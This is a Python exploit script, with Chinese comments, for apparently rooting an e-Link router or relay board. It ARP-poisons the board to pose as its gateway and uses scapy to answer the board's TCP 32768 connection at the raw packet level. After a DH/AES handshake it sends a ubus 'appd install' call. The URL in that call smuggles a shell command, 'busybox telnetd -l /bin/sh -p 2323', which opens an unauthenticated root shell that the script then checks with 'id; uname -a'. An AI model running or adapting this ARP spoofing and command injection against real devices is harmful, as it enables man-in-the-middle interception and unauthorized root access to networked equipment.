#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rawtcp_gw.py —— 不用 IP 别名、不断本机网，冒充网关收下板子的 TCP 32768

## 为什么不能用 work/net/getroot.py 的原始做法

work/docs/02-ROOT-获取.md 第 0 步写的是：
    netsh interface ipv4 add address name="WLAN" address=<网关IP> mask=255.255.255.255 skipassource=true
那是在旧拓扑下成立的：当时 PC 另有网卡上网，WLAN 只连板子，网关不在这块网卡上。

现在这台机器（戴尔本机）**只有一块 WLAN**，默认路由唯一：
    0.0.0.0/0 -> 192.168.1.1 dev WLAN(4)
而 192.168.1.1 同时是【板子的网关】和【本机的网关】。
把 192.168.1.1/32 挂到本机 WLAN 上 ⇒ 本机再也到不了真网关 ⇒ 立刻断网。
skipassource=true 只影响「选源地址」，不改变「这个 IP 是本机地址」这一事实，
所以它并不防这个断网。实测：本机加别名那一步是失败的（netsh 空返回），
但即便成功也会断网 ⇒ 本脚本一律不碰 IP 配置。

## 为什么 ARP 毒化是安全的

板子做桥接中继时，本机 → 上游路由器的流量是板子【L2 转发】的（FDB 表决定），
不经过板子自己的 IP 栈。而 ARP 应答只改板子【自身邻居表】里 <网关> 的一条记录，
所以只影响板子自己发出的 IP 包，不影响本机被桥接的流量。
脚本里带一个后台 ping 监测，一旦本机断网立刻回滚并退出。

## 怎么在「不拥有 192.168.1.1」的情况下接住这条 TCP

Windows 对不属本机的目的 IP 会静默丢弃（不回 RST，这是好事）。
所以用 scapy 在 L2 上自己实现最小 TCP 端点：
    SYN(from board) -> 我们回 SYN-ACK(源 IP = 网关，源端口 = 32768)
    -> ACK -> 数据帧交给 e-Link 状态机 -> 回 PSH-ACK
协议逻辑与 elink_gw4.py 相同（DH128 + AES-128-CBC，帧 [BE u32 0x3f721fb5][len]）。

用法：
    python rawtcp_gw.py --ip 192.168.1.175 --wait 400
"""
import argparse
import base64
import json
import os
import random
import re
import subprocess
import sys
import threading
import time

from scapy.all import (ARP, IP, TCP, UDP, Ether, Raw, AsyncSniffer, conf,
                       get_if_hwaddr, sendp, getmacbyip)

conf.use_pcap = True

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
PY = sys.executable

SRV_PORT = int(os.environ.get('SRV_PORT', '8099'))
SHELL_PORT = int(os.environ.get('SHELL_PORT', '2323'))
ELINK_PORT = int(os.environ.get('ELINK_PORT', '32768'))
MAGIC = 0x3F721FB5
LOG = os.path.join(HERE, 'rawtcp_gw.log')
_lock = threading.Lock()


def log(*a):
    line = time.strftime('[%H:%M:%S] ') + ' '.join(str(x) for x in a)
    with _lock:
        print(line, flush=True)
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


def sh(*a):
    try:
        r = subprocess.run(a, capture_output=True, timeout=30)
        for enc in ('gbk', 'utf-8'):
            try:
                return r.stdout.decode(enc)
            except Exception:
                pass
        return r.stdout.decode('gbk', 'replace')
    except Exception:
        return ''


def ps(cmd):
    return sh('powershell', '-NoProfile', '-Command', cmd)


# --------------------------------------------------------------- 探测（零硬编码）
def detect():
    out = ps("Get-NetIPConfiguration | Where-Object {$_.IPv4Address -and "
             "$_.NetAdapter.Status -eq 'Up'} | ForEach-Object { "
             "'{0}|{1}|{2}|{3}' -f $_.InterfaceAlias,$_.InterfaceIndex,"
             "$_.IPv4Address.IPAddress,$_.IPv4DefaultGateway.NextHop }")
    cands = []
    for line in out.splitlines():
        p = line.strip().split('|')
        if len(p) < 4:
            continue
        if re.search(r'WSL|Tailscale|VMware|VirtualBox|Loopback|vEthernet', p[0], re.I):
            continue
        cands.append(p)
    if not cands:
        raise SystemExit('!! 找不到物理网卡')
    cands.sort(key=lambda c: (c[3] == '',))
    alias, idx, ip, gw = cands[0]
    if not gw:
        raise SystemExit('!! 本机没有默认网关，无法确定冒充对象')
    mac = ''
    m = ps("(Get-NetAdapter -InterfaceIndex %s).MacAddress" % idx).strip()
    if re.match(r'^([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}$', m):
        mac = m.replace('-', ':').upper()
    return dict(iface=alias, ifindex=idx, my_ip=ip, gw_ip=gw, my_mac=mac)


def arp_mac(ip):
    sh('ping', '-n', '1', '-w', '800', ip)
    m = re.search(r'(' + re.escape(ip) + r')\s+([0-9a-fA-F-]{17})', sh('arp', '-a', ip))
    return m.group(2).replace('-', ':').upper() if m else ''


# --------------------------------------------------------------- 断网监测
class NetWatch(threading.Thread):
    """持续 ping 真网关和公网；一旦断了就让主流程回滚。"""

    def __init__(self, gw):
        super().__init__(daemon=True)
        self.gw = gw
        self.stop_flag = False
        self.down = False
        self.samples = []

    def run(self):
        while not self.stop_flag:
            ok_gw = self._ping(self.gw)
            ok_net = self._ping('223.5.5.5')
            self.samples.append((ok_gw, ok_net))
            if not ok_gw:
                self.down = True
                log('!! NetWatch: 到真网关 %s 不通了！' % self.gw)
            time.sleep(2)

    def _ping(self, ip):
        r = subprocess.run(['ping', '-n', '1', '-w', '1200', ip],
                           capture_output=True)
        return r.returncode == 0


# --------------------------------------------------------------- e-Link 协议
def _enc(k, d):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(k), modes.CBC(b'\x00' * 16)).encryptor()
    return c.update(d) + c.finalize()


def _dec(k, d):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(k), modes.CBC(b'\x00' * 16)).decryptor()
    return c.update(d) + c.finalize()


class Elink:
    """与 elink_gw4.py 相同的应用层逻辑，但跑在原始 TCP 之上。"""

    def __init__(self, url_payload):
        self.aes = None
        self.buf = b''
        self.url = url_payload
        self.done = False

    def feed(self, data):
        """喂入 TCP 载荷，返回要回的字节串（可能为空）。"""
        self.buf += data
        out = b''
        while True:
            if len(self.buf) < 8:
                break
            magic, ln = int.from_bytes(self.buf[0:4], 'big'), int.from_bytes(self.buf[4:8], 'big')
            if magic != MAGIC:
                self.buf = b''
                break
            if len(self.buf) < 8 + ln:
                break
            body = self.buf[8:8 + ln]
            self.buf = self.buf[8 + ln:]
            r = self._handle(body)
            if r:
                out += r
        return out

    def _frame(self, payload):
        return MAGIC.to_bytes(4, 'big') + len(payload).to_bytes(4, 'big') + payload

    def _handle(self, body):
        plain = _dec(self.aes, body) if self.aes else body
        try:
            txt = plain.rstrip(b'\x00').decode('utf-8')
        except Exception:
            log('!! 无法解码:', plain[:60].hex())
            return b''
        log('<<<', txt[:500])
        try:
            j = json.loads(txt)
        except Exception:
            log('   (填充尾，忽略)')
            return b''
        t = j.get('type')
        seq = j.get('sequence', 0)
        mac = j.get('mac', '')

        if t == 'keyngreq':
            return self._frame(json.dumps({'type': 'keyngack', 'sequence': seq, 'mac': mac,
                                           'keymode': 'dh',
                                           'data': {'keymode': 'dh'}},
                                          separators=(',', ':')).encode())

        if t == 'dh':
            d = j['data']
            pc = int.from_bytes(base64.b64decode(d['dh_key']), 'big')
            p = int.from_bytes(base64.b64decode(d['dh_p']), 'big')
            g = int.from_bytes(base64.b64decode(d['dh_g']), 'big')
            for _ in range(500):
                priv = random.randrange(2, p - 2)
                pub = pow(g, priv, p)
                sh = pow(pc, priv, p)
                sb = sh.to_bytes((p.bit_length() + 7) // 8, 'big').lstrip(b'\x00')
                if len(sb) == 16:
                    break
            self.aes = sb
            log('    AES =', sb.hex())
            return self._frame(json.dumps({
                'type': 'dh', 'sequence': seq, 'mac': mac,
                'data': {'dh_key': base64.b64encode(
                    pub.to_bytes((p.bit_length() + 7) // 8, 'big').lstrip(b'\x00')).decode(),
                    'dh_p': d['dh_p'], 'dh_g': d['dh_g']}},
                separators=(',', ':')).encode())

        if t == 'dev_reg':
            log('*** dev_reg 收到，下发 ubus_call ctcapd.appd install')
            payload = {'type': 'ubus_call', 'sequence': seq + 1, 'mac': mac,
                       'data': [{'object': 'ctcapd.appd', 'method': 'install',
                                 'message': {'url': self.url}}]}
            pl = json.dumps(payload, separators=(',', ':')).encode()
            pl += b'\x00' * ((16 - len(pl) % 16) % 16)
            self.done = True
            return self._frame(_enc(self.aes, pl))

        if t == 'ubus_call':
            log('*** ubus 结果:', json.dumps(j.get('data'), ensure_ascii=False)[:600])
            return b''

        if t == 'keepalive':
            return b''

        log('*** 业务帧', t)
        return self._frame(json.dumps({'type': 'ack', 'sequence': seq, 'mac': mac,
                                       'data': {}}, separators=(',', ':')).encode())


# --------------------------------------------------------------- 原始 TCP
class RawGw(threading.Thread):
    def __init__(self, info, board_ip, board_mac, url_payload):
        super().__init__(daemon=True)
        self.info = info
        self.bip, self.bmac = board_ip, board_mac
        self.gw = info['gw_ip']
        self.my = info['my_mac']
        self.iface = info['iface']
        self.url = url_payload
        self.el = Elink(url_payload)
        self.conn = {}
        self.stop_flag = False
        self.syn_seen = 0
        self.estab = 0
        self.other_gw_pkts = 0

    # --- 发包
    def _send(self, tcp, payload=b''):
        pkt = (Ether(src=self.my, dst=self.bmac) /
               IP(src=self.gw, dst=self.bip) /
               TCP(sport=ELINK_PORT, dport=self.conn['cport']) / tcp)
        if payload:
            pkt = pkt / Raw(payload)
        sendp(pkt, iface=self.iface, verbose=False)

    def _send_tcp(self, flags, seq, ack, payload=b''):
        pkt = (Ether(src=self.my, dst=self.bmac) /
               IP(src=self.gw, dst=self.bip) /
               TCP(sport=ELINK_PORT, dport=self.conn['cport'],
                   flags=flags, seq=seq, ack=ack, window=64240) / Raw(payload))
        sendp(pkt, iface=self.iface, verbose=False)

    def _send_multi(self, flags, seq, ack, payload=b''):
        """发多次，抗丢包（同一 seq 的重复报文对端会当重传处理）。"""
        for _ in range(3):
            try:
                self._send_tcp(flags, seq, ack, payload)
            except Exception as e:
                log('!! 发送失败', e)
            time.sleep(0.02)

    # --- 收包
    def handle(self, pkt):
        try:
            if IP not in pkt or TCP not in pkt:
                return
            ip, tcp = pkt[IP], pkt[TCP]
            if ip.src != self.bip or ip.dst != self.gw:
                return
            if int(tcp.dport) != ELINK_PORT:
                return
            cport = int(tcp.sport)
            flags = int(tcp.flags)
            payload = bytes(tcp.payload)
            isn = int(tcp.seq)

            if flags & 0x02 and not flags & 0x10:      # SYN
                self.syn_seen += 1
                # ★ 每条 TCP 连接是独立会话：必须重置应用层状态。
                #   实测不重置时，elinkclt 重连后的第一帧是明文 keyngreq，
                #   却会拿上一条连接的 AES 去解 → "length ... not a multiple of
                #   the block length" ValueError。注入虽已成功，但重连会全废。
                self.el = Elink(self.url)
                myisn = random.randrange(1 << 30, 1 << 31)
                self.conn = dict(cport=cport, myisn=myisn, myseq=myisn + 1,
                                 peerseq=isn + 1, ready=False)
                log('SYN from %s:%d (#%d) → 回 SYN-ACK' % (self.bip, cport, self.syn_seen))
                self._send_multi('SA', myisn, isn + 1)
                return

            if not self.conn or cport != self.conn['cport']:
                return

            if flags & 0x04:                            # RST
                log('RST 收到，清连接')
                self.conn = {}
                return

            if flags & 0x10 and not payload:            # 纯 ACK
                if not self.conn.get('ready'):
                    self.conn['ready'] = True
                    self.estab += 1
                    log('*** TCP 已建立 (%s:%d)' % (self.bip, cport))
                return

            if payload:
                if isn == self.conn['peerseq']:
                    self.conn['peerseq'] += len(payload)
                    out = self.el.feed(payload)
                    self._send_tcp('A', self.conn['myseq'], self.conn['peerseq'])
                    if out:
                        self._send_tcp('PA', self.conn['myseq'], self.conn['peerseq'], out)
                        self.conn['myseq'] += len(out)
                        log('>>> 回了 %d 字节' % len(out))
                else:
                    # 重传：只回 ACK 当前期望
                    self._send_tcp('A', self.conn['myseq'], self.conn['peerseq'])
        except Exception as e:
            log('!! handle 异常', type(e).__name__, e)

    def run(self):
        sn = AsyncSniffer(iface=self.iface, prn=self.handle, store=False,
                          filter='tcp and host %s and port %d' % (self.bip, ELINK_PORT))
        sn.start()
        while not self.stop_flag:
            time.sleep(0.5)
        try:
            sn.stop()
        except Exception:
            pass


# --------------------------------------------------------------- 毒化
class Poison(threading.Thread):
    def __init__(self, info, board_ip, board_mac):
        super().__init__(daemon=True)
        self.info, self.bip, self.bmac = info, board_ip, board_mac
        self.stop_flag = False
        self.sent = 0

    def run(self):
        pkt = (Ether(src=self.info['my_mac'], dst=self.bmac) /
               ARP(op=2, hwsrc=self.info['my_mac'], psrc=self.info['gw_ip'],
                   hwdst=self.bmac, pdst=self.bip))
        while not self.stop_flag:
            try:
                sendp(pkt, iface=self.info['iface'], verbose=False)
                self.sent += 1
            except Exception:
                pass
            time.sleep(1.0)
        log('毒化停止，共 %d 个 ARP 应答' % self.sent)

    def restore(self):
        try:
            real = getmacbyip(self.info['gw_ip'])
            if not real:
                log('还原：读不到真网关 MAC，跳过（板子会自行重新 ARP）')
                return
            for _ in range(6):
                sendp(Ether(src=real, dst=self.bmac) /
                      ARP(op=2, hwsrc=real, psrc=self.info['gw_ip'],
                          hwdst=self.bmac, pdst=self.bip),
                      iface=self.info['iface'], verbose=False)
                time.sleep(0.3)
            log('已向板子还原真网关 MAC %s' % real)
        except Exception as e:
            log('还原失败:', e)


# --------------------------------------------------------------- 支撑
def port_open(ip, port, t=1.0):
    import socket
    try:
        socket.create_connection((ip, port), t).close()
        return True
    except Exception:
        return False


def verify_root(ip):
    import socket
    try:
        s = socket.create_connection((ip, SHELL_PORT), 8)
    except Exception as e:
        return False, repr(e)
    s.settimeout(6)
    time.sleep(1.5)
    try:
        s.recv(65535)
    except Exception:
        pass
    txt = ''
    try:
        s.sendall(b'id; uname -a\n')
        time.sleep(1.8)
        txt = s.recv(65535).decode('utf-8', 'replace')
    except Exception:
        pass
    s.close()
    return ('uid=0' in txt), txt.strip()[:400]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--ip', required=True)
    ap.add_argument('--wait', type=int, default=400)
    a = ap.parse_args()

    log('=' * 62)
    info = detect()
    for k in ('iface', 'my_ip', 'my_mac', 'gw_ip'):
        log('  %-7s = %s' % (k, info[k]))
    mac = arp_mac(a.ip)
    if not mac:
        raise SystemExit('!! 读不到板子 MAC')
    log('板子 = %s  MAC = %s' % (a.ip, mac))
    log('冒充网关 = %s（不加别名，不断本机网）' % info['gw_ip'])

    if port_open(a.ip, SHELL_PORT):
        ok, tail = verify_root(a.ip)
        if ok:
            log('=== 2323 已开且是 root ===')
            log(tail)
            return 0

    # 后台 HTTP（注入的 telnetd 起来后；appd 的 wget 也会打这个地址）
    logf = open(os.path.join(HERE, 'srv.log'), 'a', encoding='utf-8', errors='replace')
    srv = subprocess.Popen([PY, 'srv.py', '--port', str(SRV_PORT)],
                           stdout=logf, stderr=subprocess.STDOUT, cwd=HERE)
    log('HTTP 服务 pid %d  http://%s:%d' % (srv.pid, info['my_ip'], SRV_PORT))

    url = 'http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p %d >/dev/null 2>&1 &);' % (
        info['my_ip'], SRV_PORT, SHELL_PORT)
    log('注入载荷: %s' % url)

    watch = NetWatch(info['gw_ip'])
    watch.start()

    raw = RawGw(info, a.ip, mac, url)
    raw.start()
    time.sleep(0.5)
    poi = Poison(info, a.ip, mac)
    poi.start()

    t0 = time.time()
    last = 0
    rc = 1
    try:
        while time.time() - t0 < a.wait:
            if watch.down:
                log('!! 本机网络被打断 → 立即回滚退出')
                rc = 3
                break
            if port_open(a.ip, SHELL_PORT):
                time.sleep(2)
                ok, tail = verify_root(a.ip)
                if ok:
                    log('=' * 62)
                    log('=== 成功！root shell: telnet %s %d ===' % (a.ip, SHELL_PORT))
                    log(tail)
                    rc = 0
                    break
            if time.time() - last > 20:
                last = time.time()
                log('…%ds  SYN=%d  已建立=%d  ARP=%d  dev_reg=%s' %
                    (time.time() - t0, raw.syn_seen, raw.estab, poi.sent, raw.el.done))
            time.sleep(2)
        else:
            log('!! 超时')
    finally:
        poi.stop_flag = True
        time.sleep(1.2)
        poi.restore()
        raw.stop_flag = True
        watch.stop_flag = True
        if rc != 0:
            srv.terminate()
        log('NetWatch 采样 = %s' % watch.samples[-6:])
    return rc


if __name__ == '__main__':
    sys.exit(main())
